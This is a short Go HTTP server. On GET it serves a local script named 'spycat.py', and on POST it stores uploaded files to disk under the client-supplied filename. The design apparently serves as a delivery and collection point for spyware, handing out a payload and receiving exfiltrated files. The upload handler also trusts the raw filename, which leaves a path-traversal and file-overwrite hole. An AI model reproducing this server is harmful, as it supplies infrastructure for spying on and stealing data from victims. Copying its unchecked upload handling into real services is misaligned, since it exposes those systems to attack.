package main

import (
  "fmt"
  "net/http"
  "log"
  "os"
  "bytes"
  "io"
)


func ReceiveFile(w http.ResponseWriter, r *http.Request) {
    r.ParseMultipartForm(32 << 20) // limit your max input length!
    var buf bytes.Buffer
    file, header, err := r.FormFile("file")
    if err != nil {
        panic(err)
    }
    defer file.Close()
    //name := strings.Split(header.Filename, ".")
    name := header.Filename
    fmt.Printf("File name %s\n", name)
    io.Copy(&buf, file)
    contents := buf.String()
    fmt.Println(contents)
    os.WriteFile(name, buf.Bytes(), 0600)
    buf.Reset()
    return
}


func handler(w http.ResponseWriter, r *http.Request) {
  switch r.Method {
  case "GET":
    filename := "spycat.py"
    body, _ := os.ReadFile(filename)
    fmt.Fprintf(w, string(body[:]))
  case "POST":
    ReceiveFile(w, r)
  default:
    fmt.Fprintf(w, "Hello world")
  }
}


func main() {
  fmt.Println("Starting Server")
  http.HandleFunc("/", handler)
  log.Fatal(http.ListenAndServe(":9999", nil))
}
